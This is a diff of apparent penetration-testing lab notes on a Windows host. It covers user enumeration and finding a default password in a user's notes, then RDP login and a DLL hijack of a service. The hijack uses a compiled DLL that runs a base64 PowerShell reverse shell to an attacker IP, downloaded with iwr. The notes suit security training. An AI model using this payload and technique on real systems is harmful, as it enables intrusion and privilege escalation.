@@ -881,8 +881,8 @@ C:\Windows\system32>net helpmsg 3515
 C:\Windows\system32>net user
 	User accounts for \\CLIENTWK222
 	-------------------------------------------------------------------------------
-	Administrator            alex                     DefaultAccount           
-	diana                    enterpriseadmin          enterpriseuser           
+	Administrator            alex                     DefaultAccount                  #<--NOTE alex user
+	diana                    enterpriseadmin          enterpriseuser                  #<--NOTE enterpriseadmin user
 	Guest                    offsec                   WDAGUtilityAccount       
 	The command completed successfully.
 
@@ -892,29 +892,198 @@ C:\Windows\system32>net user diana
 	Local Group Memberships      *Performance Log Users*Users                
 	Global Group memberships     *None                 
 
-
 C:\Windows\system32>net user alex
 	...
 	Local Group Memberships      *Remote Desktop Users *Remote Management Use  *Users                
 	Global Group memberships     *None                 
-
 
 C:\Windows\system32>net user offsec
 	...
 	Local Group Memberships      *Administrators       *Users                
 	Global Group memberships     *None                 
 
-# Get History
-PS C:\Windows\system32> Get-History
+C:\Windows\system32> net user enterpriseuser
+	...
+	Local Group Memberships      *Backup Operators     *Users                
+	Global Group memberships     *None                 
 
-PS C:\Windows\system32> (Get-PSReadlineOption).HistorySavePath
-	(Get-PSReadlineOption).HistorySavePath
-	Get-PSReadlineOption : The term 'Get-PSReadlineOption' is not recognized as the name of a cmdlet, function, script...
+C:\Windows\system32>net user enterpriseadmin
+	...
+	Local Group Memberships      *Administrators       *Users                
+	Global Group memberships     *None
 
-# Get system info
-PS C:\Windows\system32> systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"OS Type"
-	OS Name:                   Microsoft Windows 11 Pro
-	OS Version:                10.0.22000 N/A Build 22000
+# Get user files
+PS C:\users\diana> get-childitem -path . -include *.txt,*.pdf,*.ini,*.xls,*.xlsx,*.doc,*.docx -recurse -erroraction SilentlyContinue
+    Directory: C:\users\diana\Documents
+	Mode                 LastWriteTime         Length Name                                                                 
+	----                 -------------         ------ ----                                                                 
+	-a----         9/16/2022  11:04 AM             38 note1.txt                                                            
+	-a----         9/16/2022  11:04 AM             45 note10.txt                                                           
+	-a----         9/16/2022  11:04 AM             38 note11.txt                                                           
+	-a----         9/16/2022  11:04 AM             44 note12.txt                                                           
+	-a----         9/16/2022  11:04 AM             78 note13.txt                                                           
+	-a----         9/16/2022  11:04 AM             62 note14.txt                                                           
+	-a----         9/16/2022  11:04 AM             90 note15.txt                                                           
+	-a----         9/16/2022  11:04 AM             57 note16.txt                                                           
+	-a----         9/16/2022  11:04 AM             78 note17.txt                                                           
+	-a----         9/16/2022  11:04 AM             55 note18.txt                                                           
+	-a----         9/16/2022  11:04 AM             69 note19.txt                                                           
+	-a----         9/16/2022  11:04 AM             61 note2.txt                                                            
+	-a----         9/16/2022  11:04 AM            104 note20.txt                                                           
+	-a----         9/16/2022  11:04 AM             53 note21.txt                                                           
+	-a----         9/16/2022  11:04 AM              0 note22.txt                                                           
+	-a----         9/16/2022  11:04 AM             81 note3.txt                                                            
+	-a----         9/16/2022  11:04 AM             77 note4.txt                                                            
+	-a----         9/16/2022  11:04 AM             45 note5.txt                                                            
+	-a----         9/16/2022  11:04 AM             87 note6.txt                                                            
+	-a----         9/16/2022  11:04 AM             82 note7.txt                                                            
+	-a----         9/16/2022  11:04 AM             55 note8.txt                                                            
+	-a----         9/16/2022  11:04 AM             38 note9.txt
 
-# Get running processes
+# Condense all notes into one file and read
+PS C:\users\diana> type Documents\*.txt > Documents\allnotes
+
+PS C:\users\diana> type Documents\allnotes
+	Passwordless????? Zero trust????????
+	Fearless transparent nothing to hide. Check
+	microchip shortage - call DevOps/IT?
+	Get rental confirmation receipt from Handy
+	Where are provisioning scripts stored? Passwords should be hashed on them???
+	MS.17 010? MS 08-067? Phase out XP OT boxes within the year.
+	Board wants us to change all passwords every 10 days for security? Roll out by end of Q2
+	TODO: remove certutil.exe - being used by APTs (NGOs??)
+	15.20 for lunch, my split, burgr from intern jim - maybe payroll/hr ask them
+	who's responsible for Jenkins? ask Alex after holiday
+	IN PROGRESS: move all internal backup services to not run as SYSTEM
+	Default password for new resets will be WelcomeToWinter0121                                                #<--NOTE
+	Alex's password expired, but he's on holiday for the next 4 weeks. Password reset by IT to the default
+	PTO being phased out - HR being replaced with SaaS?
+	new directive: Security team is being outsourced end of Q3. Look on freelancer?
+	"In the midst of chaos, there is also opportunity." - Sun Tzu. look this up
+	remember to bring PDFs to the board meeting
+	security are mentioning domain administrator (??) compromise - look into it next week
+	Apparently they have SSH for Windows now? Remove netcat hack when ssh is working
+	Fall (autumn?), Winter, end of the year - Accounts???
+	Point by point refutation statements
+
+# Use default password to attempt RDP attempt via user `alex`
+xfreerdp /cert-ignore /compression /auto-reconnect /u:alex /p:WelcomeToWinter0121 /v:192.168.192.222
+```
+
+- Got RDP session W00t!
+```powershell
+# Check privs
+PS C:\Users\alex> whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	Privilege Name                Description                          State
+	============================= ==================================== ========
+	SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
+	SeUndockPrivilege             Remove computer from docking station Disabled
+	SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
+	SeTimeZonePrivilege           Change the time zone                 Disabled
+
+# Check files
+PS C:\Users\alex> Get-ChildItem -path . -include *.txt,*.pdf,*.ini,*.xls,*.xlsx,*.doc,*.docx -recurse -erroraction SilentlyContinue
+	# no results
+
+# No PS/ Readline history or exploitable apps
+
+# Check services
+PS C:\Users\alex> Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {($_.State -like 'Running') -and ($_.PathName -notlike 'C:\Windows\system32\*')}
+
+Name              State   PathName
+----              -----   --------
+EnterpriseService Running "C:\Services\EnterpriseService.exe"       #<--NOTE
+LSM               Running
+VGAuthService     Running "C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"
+VMTools           Running "C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"
+WinDefend         Running "C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2210.6-0\MsMpEng.exe"
+
+# Check service folder
+PS C:\Users\alex> dir c:\services\
+    Directory: C:\services
+		Mode                 LastWriteTime         Length Name
+		----                 -------------         ------ ----
+		-ar---         9/14/2022   8:49 AM         251392 EnterpriseService.exe
+		-a----         3/28/2024   8:17 PM            100 EnterpriseServiceLog.log
+		-ar---         7/17/2019   2:31 AM          59392 nc.exe
+
+PS C:\Users\alex> type C:\services\EnterpriseServiceLog.log
+	[00:00:00.000] (c2c) WARN   Couldn't load EnterpriseServiceOptional.dll, only using basic features.
+
+
+# Download dll replacement to path where service starts from, and restart service
+PS C:\Users\alex> iwr -uri http://192.168.45.246/myDLL.dll -Outfile C:\Services\EnterpriseServiceOptional.dll
+
+PS C:\Users\alex> Restart-Service EnterpriseService
+```
+	- adduser doesn't work.
+	- try a different thing for dll.
+
+- GoTo revshells.com and grab the powershell base64 encode and use that for the `i = system("<powershell reverse shell base64 encoded")` payload
+```c++
+# include <stdlib.h>
+# include <windows.h>
+
+BOOL APIENTRY DllMain(
+        HANDLE hModule,                 //Handle to DLL module
+        DWORD ul_reason_for_call,       //Reason for calling function
+        LPVOID lpReserved )             //Reserved
+{
+        switch (ul_reason_for_call)
+        {
+                case DLL_PROCESS_ATTACH:        //A process is loading the DLL
+                int i;
+                i = system("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA2ACIALAA1ADUANQA1ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==");
+                break;
+
+                case DLL_THREAD_ATTACH:         //A process is creating a new thread
+                break;
+
+                case DLL_THREAD_DETACH:         //A thread exits normally
+                break;
+
+                case DLL_PROCESS_DETACH:        //A process unloads the DLL
+                break;
+        }
+        return TRUE;
+}
+```
+
+- Compile & start listener
+```bash
+x86_64-w64-mingw32-gcc myDLL_shell.cpp --shared -o myDLL_shell.dll
+
+nc -nlvp 5555
+```
+
+- Download on victim to path where service starts from and restart
+```powershell
+PS C:\Users\alex> iwr -uri http://192.168.45.246/myDLL_shell.dll -Outfile C:\Services\EnterpriseServiceOptional.dll
+
+PS C:\Users\alex> Restart-Service EnterpriseService
+```
+
+- nc listener
+```powershell
+whoami
+	clientwk222\enterpriseuser
+
+PS C:\users\enterpriseuser> whoami /priv
+	PRIVILEGES INFORMATION
+	----------------------
+	Privilege Name                Description                               State   
+	============================= ========================================= ========
+	SeBackupPrivilege             Back up files and directories             Disabled
+	SeRestorePrivilege            Restore files and directories             Disabled
+	SeShutdownPrivilege           Shut down the system                      Disabled      #<--NOTE
+	SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+	SeUndockPrivilege             Remove computer from docking station      Disabled
+	SeImpersonatePrivilege        Impersonate a client after authentication Enabled       #<--NOTE
+	SeCreateGlobalPrivilege       Create global objects                     Enabled 
+	SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+	SeTimeZonePrivilege           Change the time zone                      Disabled
+
+
 ```
